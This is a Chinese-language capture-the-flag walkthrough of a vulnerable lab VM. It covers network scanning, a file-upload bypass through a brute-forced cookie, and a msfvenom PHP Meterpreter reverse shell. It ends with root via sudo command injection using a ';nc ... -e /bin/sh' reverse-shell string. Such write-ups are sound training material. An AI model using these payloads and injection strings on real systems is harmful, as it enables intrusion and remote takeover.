查看kali IP地址

ip a

![1627054362_60fae11a89e649a5aaf5a.png!small](https://image.3001.net/images/20210723/1627054362_60fae11a89e649a5aaf5a.png!small)

所在网段为 192.168.74.0/24

使用nmap扫描整个网段

nmap -v -sP 192.168.74.0/24

![1627054373_60fae1252b887cb936199.png!small](https://image.3001.net/images/20210723/1627054373_60fae1252b887cb936199.png!small)

扫描结果显示靶机地址疑似为 192.168.74.131

扫描该地址的端口情况

nmap -v -sV 192.168.74.131

![1627054406_60fae146259f5ee86a4c0.png!small](https://image.3001.net/images/20210723/1627054406_60fae146259f5ee86a4c0.png!small)

发现只开放了22和80端口

尝试访问web服务

![1627054422_60fae156dcafd642916a5.png!small](https://image.3001.net/images/20210723/1627054422_60fae156dcafd642916a5.png!small)

似乎只是个静态页面

查看网页源码

![1627054431_60fae15f50783a03cdff9.png!small](https://image.3001.net/images/20210723/1627054431_60fae15f50783a03cdff9.png!small)

没有什么特别的线索

扫描整个网站目录

dirb http://192.168.74.131/

![1627054462_60fae17e0ba677306c26b.png!small](https://image.3001.net/images/20210723/1627054462_60fae17e0ba677306c26b.png!small)

![1627054484_60fae194283c96d071f18.png!small](https://image.3001.net/images/20210723/1627054484_60fae194283c96d071f18.png!small)

![1627054500_60fae1a47ea80fb2cb36d.png!small](https://image.3001.net/images/20210723/1627054500_60fae1a47ea80fb2cb36d.png!small)

![1627054508_60fae1acabe579f21fb53.png!small](https://image.3001.net/images/20210723/1627054508_60fae1acabe579f21fb53.png!small)

![1627054529_60fae1c1f0a1fdade9cf1.png!small](https://image.3001.net/images/20210723/1627054529_60fae1c1f0a1fdade9cf1.png!small)

这里文件上传到ajax.php进行处理，前端没有任何过滤限制

尝试上传一个jpg文件，上传失败，后端存在文件限制

查看ajax.php.bak

![1627054617_60fae219405fe45af12ad.png!small](https://image.3001.net/images/20210723/1627054617_60fae219405fe45af12ad.png!small)

根据提示，一般情况只能上传成功txt文件，在存在cookie和secure参数后才能上传php文件

![1627054626_60fae22200eb90195a5da.png!small](https://image.3001.net/images/20210723/1627054626_60fae22200eb90195a5da.png!small)

上传一个txt文件，发现上传的文件保存在owls下

![1627054633_60fae229906a9086fcc60.png!small](https://image.3001.net/images/20210723/1627054633_60fae229906a9086fcc60.png!small)

未发现登录或者能够添加secure参数的接口，于是使用burpsuite抓包尝试

随便选择一个php文件上传拦截

![1627054641_60fae231a5da421033a39.png!small](https://image.3001.net/images/20210723/1627054641_60fae231a5da421033a39.png!small)

在repeater中添加cookie和secure字段

cookie最后一位未知，先以字母A代替

![1627054716_60fae27cdfa5f1ca08145.png!small](https://image.3001.net/images/20210723/1627054716_60fae27cdfa5f1ca08145.png!small)

进行cookie暴破

![1627054745_60fae299791e44407807e.png!small](https://image.3001.net/images/20210723/1627054745_60fae299791e44407807e.png!small)

根据提示添加字典

![1627054750_60fae29ed45d913e41d86.png!small](https://image.3001.net/images/20210723/1627054750_60fae29ed45d913e41d86.png!small)

![1627054778_60fae2ba42f20ecb77bbe.png!small](https://image.3001.net/images/20210723/1627054778_60fae2ba42f20ecb77bbe.png!small)

成功找出正确cookie并上传了php文件

![1627054788_60fae2c4b3c365e73118a.png!small](https://image.3001.net/images/20210723/1627054788_60fae2c4b3c365e73118a.png!small)

用msf生成一个payload

msfvenom -p php/meterpreter_reverse_tcp lhost=192.168.74.132 -o shell.php

![1627054802_60fae2d29c7c2df089ee7.png!small](https://image.3001.net/images/20210723/1627054802_60fae2d29c7c2df089ee7.png!small)

用同样的方法将shell.php上传上去

![1627054808_60fae2d8742e542831a88.png!small](https://image.3001.net/images/20210723/1627054808_60fae2d8742e542831a88.png!small)

![1627054822_60fae2e6c38b31cb340c1.png!small](https://image.3001.net/images/20210723/1627054822_60fae2e6c38b31cb340c1.png!small)

进行连接

use exploit/multi/handler

set lhost 192.168.74.132

set payload php/meterpreter_reverse_tcp

run

![1627054832_60fae2f03cfeb2d33a6cf.png!small](https://image.3001.net/images/20210723/1627054832_60fae2f03cfeb2d33a6cf.png!small)

访问一下shell.php

![1627054840_60fae2f8787e5b18fd765.png!small](https://image.3001.net/images/20210723/1627054840_60fae2f8787e5b18fd765.png!small)

连接上了

![1627054847_60fae2ff1d3a5a1944d2a.png!small](https://image.3001.net/images/20210723/1627054847_60fae2ff1d3a5a1944d2a.png!small)

使用python3弹回一个完整交互shell

python3 -c 'import pty; pty.spawn("/bin/bash")'

![1627054858_60fae30ab2c1e7b47c0c1.png!small](https://image.3001.net/images/20210723/1627054858_60fae30ab2c1e7b47c0c1.png!small)

查看所有用户

cat /etc/passwd

![1627054885_60fae325720dbb0f3022e.png!small](https://image.3001.net/images/20210723/1627054885_60fae325720dbb0f3022e.png!small)

发现athena普通用户，寻找线索

找到一条flag

FLAG : 4WpJT9qXoQwFGeoRoFBEJZiM2j2Ad33gWipzZkStMLHw

![1627054900_60fae334c21f5fd26cc17.png!small](https://image.3001.net/images/20210723/1627054900_60fae334c21f5fd26cc17.png!small)

password : myvulnerableapp[Asterisk]

![1627054916_60fae3446d3338f464e76.png!small](https://image.3001.net/images/20210723/1627054916_60fae3446d3338f464e76.png!small)

![1627055036_60fae3bc6d42ff58c62b1.png!small](https://image.3001.net/images/20210723/1627055036_60fae3bc6d42ff58c62b1.png!small)

根据密码提示猜测用户athena的密码 myvulnerableapp* 成功切换到athena用户

![1627054926_60fae34ec29ec162eb8df.png!small](https://image.3001.net/images/20210723/1627054926_60fae34ec29ec162eb8df.png!small)

以athena的身份进行ssh连接

查看athena允许执行的命令

sudo -l

![1627055095_60fae3f7b81910957da1a.png!small](https://image.3001.net/images/20210723/1627055095_60fae3f7b81910957da1a.png!small)

以root权限执行这条命令

sudo python3 /home/team-tasks/cookie-gen.py

根据之前cookie-gen.py的源码分析，构造shellcode将root shell弹给kali

;nc 192.168.74.132 12138 -e /bin/sh

![1627055175_60fae4473775fcdda95ce.png!small](https://image.3001.net/images/20210723/1627055175_60fae4473775fcdda95ce.png!small)

在kali中进行监听

nc -nvlp 12138

![1627055187_60fae4534ece9c9c3d353.png!small](https://image.3001.net/images/20210723/1627055187_60fae4534ece9c9c3d353.png!small)

